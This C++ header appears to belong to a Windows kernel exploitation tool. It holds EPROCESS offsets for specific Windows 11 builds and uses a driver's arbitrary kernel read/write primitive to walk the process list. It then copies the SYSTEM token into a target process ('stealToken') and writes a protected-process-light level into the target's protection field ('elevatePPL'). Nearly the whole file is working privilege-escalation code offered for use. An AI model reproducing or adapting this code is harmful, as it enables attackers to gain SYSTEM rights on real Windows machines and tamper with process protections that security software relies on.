#pragma once

#include "driverOps.h"
#include "myIO.hpp"
#include "NT_Definitions.h"

// do wykasowania
#include <cassert>
#include <iomanip>
#include <iostream>
#include <vector>
#include <Windows.h>
//

#include <string>
#include <map>
#include <stdexcept>

std::map < std::string, offsets> Offsets_Dict = {
    {
        "10.0.26100.8875",
        offsets{ // 26200.8875
            0xfc6af0,  // PsInitialSystemProcess WIN11 25H2 (ntoskrnl.exe base address - PsInitialSystemProcess address |=| ? nt!PsInitialSystemProcess - nt) 
            0x248, // Token,
            0x1d0, // UniqueProcessId,
            0x1d8, // ActiveProcessLinks
            0x5fa  // PS_Protection
        }
    },
    {
        "10.0.26100.9711", 
        offsets{ // 26200.9711
            0xFC6ab0,  // PsInitialSystemProcess WIN11 25H2 (ntoskrnl.exe base address - PsInitialSystemProcess address |=| ? nt!PsInitialSystemProcess - nt) 
            0x248, // Token,
            0x1d0, // UniqueProcessId,
            0x1d8, // ActiveProcessLinks
            0x5fa  // PS_Protection
        }
    }
};
offsets current_offsets{};

/* DEPRECATED, now using NTAPI version of it
bool getCurrentVersion_WinAPI(std::string& version) { // to change into NTAPI
#pragma comment(lib, "version.lib")

    const auto system = L"kernel32.dll";
    DWORD dummy;
    const auto cbInfo =
        ::GetFileVersionInfoSizeExW(FILE_VER_GET_NEUTRAL, system, &dummy);

    std::vector<char> buffer(cbInfo);

    ::GetFileVersionInfoExW(FILE_VER_GET_NEUTRAL, system, dummy, buffer.size(), &buffer[0]);

    void* p = nullptr;
    UINT size = 0;
    ::VerQueryValueW(buffer.data(), L"\\", &p, &size);
    if (size < sizeof(VS_FIXEDFILEINFO)) {
        return false;
    }
    if(p == nullptr) {
        return false;
    }
    const VS_FIXEDFILEINFO* pFixed = static_cast<const VS_FIXEDFILEINFO*>(p);
    //std::cout << HIWORD(pFixed->dwFileVersionMS) << '.'
    //    << LOWORD(pFixed->dwFileVersionMS) << '.'
    //    << HIWORD(pFixed->dwFileVersionLS) << '.'
    //    << LOWORD(pFixed->dwFileVersionLS) << '\n';
    version += std::to_string(HIWORD(pFixed->dwFileVersionMS)) + '.';
    version += std::to_string(LOWORD(pFixed->dwFileVersionMS)) + '.';
    version += std::to_string(HIWORD(pFixed->dwFileVersionLS)) + '.';
    version += std::to_string(LOWORD(pFixed->dwFileVersionLS));

    return true;
} */

bool loadOffsets(std::string& version) {

    //if (!getCurrentVersion_WinAPI(version)) {
    //    return false;
    //}
    if (!getCurrentVersion_NTAPI(version)) {
        return false;
    }

    auto it = Offsets_Dict.find(version);
    if (it == Offsets_Dict.end()) {
        return false;
    }
    current_offsets = it->second;
    return true;
}

bool EnablePrivilege(PCWSTR name)
{
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
        return false;

    LUID luid;
    bool result = false;
    if (LookupPrivilegeValue(nullptr, name, &luid)) {
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr)) {
            result = GetLastError() == ERROR_SUCCESS;
        }
    }

    CloseHandle(hToken);
    return result;
}

int getEPROCESSES(_In_ DriverOps* driver, _Out_ DWORD64* systemProcess, _Out_ DWORD64* targetProcess, _In_ const PVOID ImageBase, _In_ const ULONG64 targetPID)
{
    KernelReadWrite krw = { 0 };

    DWORD64 currentProcess = 0;
    krw.src = (LPVOID)((ULONG64)ImageBase + current_offsets.PsInitialSystemProcess);
    krw.dst = (LPVOID)(&currentProcess);
    krw.size = sizeof(DWORD64);
    if (!driver->arbitraryRW(&krw)) {
        return 3;
    }

    DWORD64 currentProcessListAddress = currentProcess + current_offsets.ActiveProcessLinks;
    DWORD64 HeadListAddress = currentProcessListAddress;

    int safety_couter = 0;
    bool systemProcessAchieved = FALSE;
    bool targetProcessAchieved = FALSE;

    while (1)
    {
        ULONG64 PID = 0;
        krw.src = (LPVOID)(currentProcess + current_offsets.UniqueProcessId);
        krw.dst = (LPVOID)(&PID);
        krw.size = sizeof(ULONG64);
        if (!driver->arbitraryRW(&krw)) {
            return 3;
        }

        if (PID == 4) {
            *systemProcess = currentProcess;
            systemProcessAchieved = TRUE;
        }
        else if (PID == targetPID) {
            *targetProcess = currentProcess;
            targetProcessAchieved = TRUE;
        }


        _LIST_ENTRY activeProcessLinks;
        krw.src = (LPVOID)currentProcessListAddress;
        krw.dst = (LPVOID)(&activeProcessLinks);
        krw.size = sizeof(_LIST_ENTRY);
        if (!driver->arbitraryRW(&krw)) {
            return 3;
        }

        DWORD64 nextAPLAddress = (DWORD64)activeProcessLinks.Flink;
        DWORD64 nextProcess = nextAPLAddress - current_offsets.ActiveProcessLinks;

        currentProcess = nextProcess;
        currentProcessListAddress = nextAPLAddress;

        if (targetProcessAchieved && systemProcessAchieved) return 0;
        if (HeadListAddress == currentProcessListAddress)   return 1;
        if (safety_couter++ > 5000)                         return 2;
    }
}

void printLPVOIDValue(LPVOID s)
{
    char* ss = (char*)s; // put breakpoint here or watch the variable
    for (char* r = ss; *r != '\0'; r += (strlen(r) + 1)) { // iterate the string
        printf("%s \n", r);
    }
}

bool stealToken(_In_ DriverOps* driver, _In_ DWORD64 systemProcess, _In_ DWORD64 targetProcess)
{
    KernelReadWrite krw = { 0 };
    krw.src = (LPVOID)(systemProcess + current_offsets.Token);
    krw.dst = (LPVOID)(targetProcess + current_offsets.Token);
    krw.size = sizeof(_EX_FAST_REF);

    /* DEBUG
    KernelReadWrite krw_1 = { 0 };
    ULONGLONG Val_1 = 0;
    krw_1.src = (LPVOID)(systemProcess + g_offsets.Token);
    krw_1.dst = (LPVOID)(&Val_1);
    krw_1.size = sizeof(_EX_FAST_REF);
    driver->arbitraryRW(&krw_1);
    printf("Token system: %llu\n", Val_1);

    KernelReadWrite krw_2 = { 0 };
    ULONGLONG Val_2 = 0;
    krw_2.src = (LPVOID)(targetProcess + g_offsets.Token);
    krw_2.dst = (LPVOID)(&Val_2);
    krw_2.size = sizeof(_EX_FAST_REF);
    driver->arbitraryRW(&krw_2);
    printf("Token target: %llu\n", Val_2);
    */
    auto returnVal = driver->arbitraryRW(&krw);
    /* Debug
    printf("after steal:\n");
    driver->arbitraryRW(&krw_1);
    printf("Token system: %llu\n", Val_1);
    driver->arbitraryRW(&krw_2);
    printf("Token target: %llu\n", Val_2);
    */

    return returnVal;
}

//0x1 bytes (sizeof)
struct _PS_PROTECTION
{
    union
    {
        UCHAR Level;                                                        //0x0
        struct
        {
            UCHAR Type : 3;                                                   //0x0
            UCHAR Audit : 1;                                                  //0x0
            UCHAR Signer : 4;                                                 //0x0
        };
    };
};

bool elevatePPL(_In_ DriverOps* driver, _In_ DWORD64 targetProcess)
{
    //KernelReadWrite krw = { 0 };
    //krw.src = (LPVOID)(targetProcess + g_offsets.Token);
    //krw.dst = (LPVOID)(targetProcess + g_offsets.Token);
    //krw.size = sizeof(_EX_FAST_REF);

 //   /* DEBUG

    KernelReadWrite krw_2 = { 0 };
    struct _PS_PROTECTION Val_2 {};
    Val_2.Level = 0x61;
    krw_2.dst = (LPVOID)(targetProcess + current_offsets.PS_PROTECTION);
    krw_2.src = (LPVOID)(&Val_2);
    krw_2.size = sizeof(struct _PS_PROTECTION);
    driver->arbitraryRW(&krw_2);
    printf("Token target: %hhu\n", Val_2.Level);
//    */
    auto returnVal = driver->arbitraryRW(&krw_2);
//    /* Debug

    printf("Token target: %hhu\n", Val_2.Level);
//    */

    return returnVal;
}